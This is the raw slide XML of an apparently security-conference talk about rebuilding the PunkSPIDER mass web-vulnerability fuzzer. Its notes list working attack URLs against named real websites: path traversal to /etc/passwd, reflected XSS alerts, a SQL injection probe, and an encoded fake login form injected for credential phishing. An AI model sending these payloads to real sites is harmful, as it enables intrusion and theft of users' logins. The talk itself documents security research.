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30"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="257" r:id="rId3"/>
    <p:sldId id="270" r:id="rId4"/>
    <p:sldId id="259" r:id="rId5"/>
    <p:sldId id="271" r:id="rId6"/>
    <p:sldId id="272" r:id="rId7"/>
    <p:sldId id="273" r:id="rId8"/>
    <p:sldId id="260" r:id="rId9"/>
    <p:sldId id="258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69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73"/>
    <p:restoredTop sz="94694"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" snapToObjects="1">
      <p:cViewPr>
        <p:scale>
          <a:sx n="125" d="100"/>
          <a:sy n="125" d="100"/>
        </p:scale>
        <p:origin x="672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cripture4all.org/pdf_interlinear/info/?f=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd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" name="Google Shape;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dd265bc753_3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D1D1D"/>
                </a:solidFill>
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>I added the bullet Key Metrics</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Google Shape;42;gdd265bc753_3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dfd8b4f60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dfd8b4f60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0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df72ef75b6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" name="Google Shape;56;gdf72ef75b6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1100" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>primeinvestor.in</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>/stocks-list/?sector=%27%29--%23 &lt;--- maybe skip</a:t>
            </a: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1100" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>archive.org</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>search.php?sin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>=&amp;query=%22%27%3E%3CScRiPt%3E%3Balert(31337)%3B%3C/ScRiPt%3E</a:t>
            </a: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1100" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>www.toysrus.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>/search/?lang=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>en_US&amp;q</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>=%22%3CScRiPt%3E%3Balert(31337)%3B%3C/ScRiPt%3E%3CScRiPt%3E;alert(31337);%3C/ScRiPt%3E</a:t>
            </a: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1100" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>tapas.io</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>/account/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>signin?from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>=%22%3E%3C%66%6F%72%6D%20%61%63%74%69%6F%6E%3D%22%68%74%74%70%73%3A%2F%2F%77%77%77%2E%68%79%70%65%72%69%6F%6E%67%72%61%79%2E%63%6F%6D%22%20%6D%65%74%68%6F%64%3D%22%47%45%54%22%3E%0A%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%69%6D%67%63%6F%6E%74%61%69%6E%65%72%22%3E%0A%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6F%6E%74%61%69%6E%65%72%22%3E%0A%20%20%20%20%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%75%6E%61%6D%65%22%3E%3C%62%3E%55%73%65%72%6E%61%6D%65%3C%2F%62%3E%3C%2F%6C%61%62%65%6C%3E%0A%20%20%20%20%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%74%65%78%74%22%20%70%6C%61%63%65%68%6F%6C%64%65%72%3D%22%45%6E%74%65%72%20%55%73%65%72%6E%61%6D%65%22%20%6E%61%6D%65%3D%22%75%6E%61%6D%65%22%20%72%65%71%75%69%72%65%64%3E%0A%0A%20%20%20%20%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%70%73%77%22%3E%3C%62%3E%50%61%73%73%77%6F%72%64%3C%2F%62%3E%3C%2F%6C%61%62%65%6C%3E%0A%20%20%20%20%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%70%61%73%73%77%6F%72%64%22%20%70%6C%61%63%65%68%6F%6C%64%65%72%3D%22%45%6E%74%65%72%20%50%61%73%73%77%6F%72%64%22%20%6E%61%6D%65%3D%22%70%73%77%22%20%72%65%71%75%69%72%65%64%3E%0A%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%74%79%70%65%3D%22%73%75%62%6D%69%74%22%3E%4C%6F%67%69%6E%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%3C%6C%61%62%65%6C%3E%0A%20%20%20%20%20%20%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%63%68%65%63%6B%62%6F%78%22%20%63%68%65%63%6B%65%64%3D%22%63%68%65%63%6B%65%64%22%20%6E%61%6D%65%3D%22%72%65%6D%65%6D%62%65%72%22%3E%20%52%65%6D%65%6D%62%65%72%20%6D%65%0A%20%20%20%20%3C%2F%6C%61%62%65%6C%3E%0A%20%20%3C%2F%64%69%76%3E%0A%0A%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6F%6E%74%61%69%6E%65%72%22%20%73%74%79%6C%65%3D%22%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%23%66%31%66%31%66%31%22%3E%0A%20%20%20%20%3C%62%75%74%74%6F%6E%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%63%61%6E%63%65%6C%62%74%6E%22%3E%43%61%6E%63%65%6C%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%70%73%77%22%3E%46%6F%72%67%6F%74%20%3C%61%20%68%72%65%66%3D%22%23%22%3E%70%61%73%73%77%6F%72%64%3F%3C%2F%61%3E%3C%2F%73%70%61%6E%3E%0A%20%20%3C%2F%64%69%76%3E%0A%3C%2F%66%6F%72%6D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%3Cbr%20/%3E</a:t>
            </a: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1100" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>www.lendingtree.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>/reviews/auto/?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>overallRating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>=4&amp;isLTCertified=%22%3C/a%3E%3CScRiPt%3E%3Balert(31337)%3B%3C/ScRiPt%3E</a:t>
            </a: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US" sz="1100" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://scripture4all.org/pdf_interlinear/info/?f=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" lvl="0" indent="-171450" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="900"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>www.kickstarter.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>/projects/965782254/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>punkspider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>/?ref=%22}`)%3Cscript%3Ealert(22222222222)%3C/script%3E%3Cscript%3Ealert(%27Punkspider%20is%20back!%27)%3C/script%3E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910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Three answers: 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a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>fuckton</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> of work and benchmarking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“Creative” engineering (aka repurposing tech)</a:t>
            </a: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/>
              <a:t>Back in ye olden </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Punkspider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> days</a:t>
            </a:r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Hadoop was meant for data-crunching, “Big Data” was in its nascence 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Embrace the cloud (ride the snake)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dfd8b4f608_2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gdfd8b4f608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91950" y="514950"/>
            <a:ext cx="1147625" cy="1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91950" y="514950"/>
            <a:ext cx="1147625" cy="18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3"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="973028" y="821402"/>
            <a:ext cx="445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879000" y="980675"/>
            <a:ext cx="9070200" cy="492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Rubik"/>
              <a:buNone/>
              <a:defRPr sz="2600">
                <a:solidFill>
                  <a:schemeClr val="accent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Slide">
  <p:cSld name="26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4794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0" y="4278022"/>
            <a:ext cx="12192000" cy="25799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11313675" y="6492900"/>
            <a:ext cx="6237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marL="0" lvl="1" indent="0" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef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marL="0" lvl="2" indent="0" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef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marL="0" lvl="3" indent="0" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef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marL="0" lvl="4" indent="0" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef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marL="0" lvl="5" indent="0" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef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marL="0" lvl="6" indent="0" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef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marL="0" lvl="7" indent="0" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef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marL="0" lvl="8" indent="0" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef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44000" y="605125"/>
            <a:ext cx="111585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ubik"/>
              <a:buNone/>
              <a:defRPr sz="2800" b="0" i="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"/>
              <a:buNone/>
              <a:defRPr sz="3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ubik"/>
              <a:buChar char="•"/>
              <a:defRPr sz="24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•"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•"/>
              <a:defRPr sz="1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•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•"/>
              <a:defRPr sz="1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•"/>
              <a:defRPr sz="9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•"/>
              <a:defRPr sz="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273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"/>
              <a:buChar char="•"/>
              <a:defRPr sz="7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11395829" y="6408114"/>
            <a:ext cx="3417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13"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00205B">
              <a:alpha val="659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8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="2747900" y="4836025"/>
            <a:ext cx="0" cy="1474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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="808550" y="5297671"/>
            <a:ext cx="167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qomplx.com</a:t>
            </a:r>
            <a:endParaRPr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9" name="Google Shape;39;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3780150" y="3185425"/>
            <a:ext cx="46317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5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Punkspider and IOStation</a:t>
            </a:r>
            <a:endParaRPr sz="170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/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect l="44333"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6291299" y="0"/>
            <a:ext cx="59006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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6300875" y="0"/>
            <a:ext cx="5900700" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00205B">
              <a:alpha val="6704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79000" y="980675"/>
            <a:ext cx="9070200" cy="492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Presenters</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="47" name="Google Shape;4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89688" y="514891"/>
            <a:ext cx="1152144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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="879006" y="4987800"/>
            <a:ext cx="30459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100">
              <a:solidFill>
                <a:srgbClr val="1D1D1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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="879000" y="4473950"/>
            <a:ext cx="4193400" cy="17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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Google Shape;50;p9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="799806" y="1967296"/>
            <a:ext cx="31251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dirty="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dirty="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dirty="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dirty="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Alejandro Caceres</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="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Director of Network Exploitation</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="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797596" y="5230458"/>
            <a:ext cx="23358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Jason Hopper</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="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Director of Research</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="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" name="Google Shape;52;p9"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:srcRect l="12395" r="12395"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="797596" y="1892038"/>
            <a:ext cx="1071600" cy="1068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" name="Google Shape;53;p9"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:srcRect t="1954" b="1954"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="797596" y="4132821"/>
            <a:ext cx="1071600" cy="1068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FB7897B-B257-4D04-87A7-A9B049360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000" y="980675"/>
            <a:ext cx="9070200" cy="492300"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A long long time ago...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Google Shape;114;p2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4489A4C1-81D1-7D45-8C00-D8061D9BFF0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7338848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 err="1"/>
              <a:t>PunkSPIDER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> was a distributed mass web application fuzzing project run over a Hadoop cluster and stored in a distributed back-end</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750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Sysadmins did not like us</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750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It was spelled </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>PunkSPIDER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1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No one spelled it right</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2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trike="sngStrike" dirty="0" err="1"/>
              <a:t>PUNKspider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" strike="sngStrike" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" strike="sngStrike" dirty="0" err="1"/>
              <a:t>ya</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" strike="sngStrike" dirty="0"/>
              <a:t> tried little buddy)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2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trike="sngStrike" dirty="0" err="1"/>
              <a:t>punkspider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" strike="sngStrike" dirty="0"/>
              <a:t> (you’re not even trying)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2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trike="sngStrike" dirty="0" err="1"/>
              <a:t>PunkSpider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" strike="sngStrike" dirty="0"/>
              <a:t> (eh, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" strike="sngStrike" dirty="0" err="1"/>
              <a:t>sorta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" strike="sngStrike" dirty="0"/>
              <a:t> close)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2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trike="sngStrike" dirty="0"/>
              <a:t>punk spider (come on.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2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trike="sngStrike" dirty="0"/>
              <a:t>PuNkSpiD3R (oh fuck off.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1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It was based on Hadoop 0.2.x (released circa 2011-2012)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="2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Some dude came up to me after the talk….</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1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It’s old AF</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-28575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You vaguely remember that “Shodan but with like, some SQL injection or something? And some other vulns on like.. Was it APIs? Websites??”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="685800" lvl="1" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="30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We’ve adopted this as our official slogan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5D9CC6-290B-7045-944B-D5C08F0B8C88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8263759" y="2070538"/>
            <a:ext cx="3090041" cy="30900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picture containing logo&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{889EA132-A890-604F-AE96-35464B340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671" y="2253450"/>
            <a:ext cx="2724216" cy="272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79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Still a long long time ago…</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="120" name="Google Shape;120;p3"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="879000" y="1825625"/>
            <a:ext cx="9636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Everything was MapReduce. Every. Thing.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Probably not the most efficient, but damn was it easy to use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 err="1"/>
              <a:t>Solr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> search back-end</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="120015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Ended up </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sharding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>db</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> many times, always caused problems</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1657350" lvl="3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 err="1"/>
              <a:t>Solr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> isn’t a “big data” technology really</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1657350" lvl="3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Ended up building a version with HBase</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="20574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Not bad, good performance, but it was in its infancy</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1657350" lvl="3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 err="1"/>
              <a:t>Solr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> crapped out so much I moved to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Cloudsearch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (AWS – hooray for being locked into cloud tech! More on this later…)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 My UI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>skillz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> coming up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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="126" name="Google Shape;126;p4" descr="Graphical user interface, websit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8606" y="0"/>
            <a:ext cx="11672893" cy="6547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3101FB-74CB-3945-ABD6-3529FF2D0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with the old</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Google Shape;132;p5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F504AD85-061B-2644-A970-8474199584D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11468" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Quick word of warning: don’t go to the site in the screenshot</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="311468" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>UI is slightly better than I remember - it has buttons that highlight and everything</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="311468" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Cloud &amp; Stuff</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="758825" lvl="1" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>I’ve said it in many talks - getting banned from my cloud providers, having to reindex my data, complaints from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>fuckmooks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>, and legal threats made me shelf the project for a bit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="1216025" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>But I knew it’d be back. Got the opportunity thanks to QOMPLX</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1225868" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="90000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Now we have dedicated time and resources to engineer this right</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1225868" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="90000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Moreover, we got rid of some of the complications of running this (see below)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="768668" lvl="1" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>You may think this is a victory story of how we overcame our dependence on the cloud</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1225868" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="90000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>It’s not</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1225868" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="90000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>We leaned into the cloud, decided to actually ask permission to do our project</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1683068" lvl="3" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Someone actually accepted it! I’m still not saying who</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="311468" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Out with the old</a:t>
            </a:r>
          </a:p>
          <a:p>
